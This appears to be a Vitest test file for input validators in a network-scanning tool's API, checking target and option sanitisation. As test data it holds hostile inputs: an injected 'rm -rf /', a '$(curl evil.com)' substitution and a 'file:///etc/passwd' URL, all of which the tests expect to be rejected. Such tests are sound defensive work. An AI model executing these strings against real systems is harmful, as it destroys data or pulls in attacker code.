import { describe, it, expect } from 'vitest'
import { validateTarget, sanitizeOptions } from '../api'

describe('validateTarget', () => {
  it('accepts a normal domain', () => {
    const r = validateTarget('example.com')
    expect(r.ok).toBe(true)
    expect(r.value).toBe('example.com')
  })

  it('strips control characters', () => {
    const r = validateTarget('exa\u0001mple.com')
    expect(r.ok).toBe(true)
    expect(r.value).toBe('example.com')
  })

  it('rejects shell metacharacters', () => {
    const r = validateTarget('example.com; rm -rf /')
    expect(r.ok).toBe(false)
  })

  it('rejects overly long input', () => {
    const r = validateTarget('a'.repeat(2_000))
    expect(r.ok).toBe(false)
  })

  it('warns (does not block) on private IP by default', () => {
    const r = validateTarget('192.168.1.1', 'ip')
    expect(r.ok).toBe(true)
    expect(r.warnings.length).toBeGreaterThan(0)
  })

  it('blocks private IP when blockPrivate is set', () => {
    const r = validateTarget('192.168.1.1', 'ip', { blockPrivate: true })
    expect(r.ok).toBe(false)
  })

  it('rejects non-http URL schemes', () => {
    const r = validateTarget('file:///etc/passwd', 'url')
    expect(r.ok).toBe(false)
  })

  it('accepts an https URL', () => {
    const r = validateTarget('https://example.com/path', 'url')
    expect(r.ok).toBe(true)
  })

  it('rejects out-of-range IPv4 octets', () => {
    expect(validateTarget('999.1.1.1', 'ip').ok).toBe(false)
    expect(validateTarget('1.2.3.256', 'ip').ok).toBe(false)
  })

  it('rejects IPv4 with leading-zero octets', () => {
    expect(validateTarget('01.02.03.04', 'ip').ok).toBe(false)
  })

  it('rejects malformed CIDR (out-of-range octet)', () => {
    expect(validateTarget('300.1.1.1/24', 'cidr').ok).toBe(false)
  })

  it('rejects out-of-range CIDR prefix', () => {
    expect(validateTarget('10.0.0.0/33', 'cidr').ok).toBe(false)
    expect(validateTarget('::/999', 'cidr').ok).toBe(false)
  })

  it('accepts a valid IPv4 CIDR', () => {
    expect(validateTarget('10.0.0.0/24', 'cidr').ok).toBe(true)
  })

  it('rejects URLs whose host is a structurally-invalid IPv4', () => {
    expect(validateTarget('http://999.999.999.999/', 'url').ok).toBe(false)
  })
})

describe('sanitizeOptions', () => {
  it('passes valid flags through', () => {
    const r = sanitizeOptions('--threads 50 -p-')
    expect(r.ok).toBe(true)
    expect(r.value).toContain('--threads')
  })

  it('rejects shell metacharacters', () => {
    const r = sanitizeOptions('--out $(curl evil.com)')
    expect(r.ok).toBe(false)
  })

  it('rejects overlong options', () => {
    const r = sanitizeOptions('a'.repeat(5_000))
    expect(r.ok).toBe(false)
  })

  it('returns empty for empty input', () => {
    expect(sanitizeOptions('').value).toBe('')
    expect(sanitizeOptions(null).value).toBe('')
  })
})
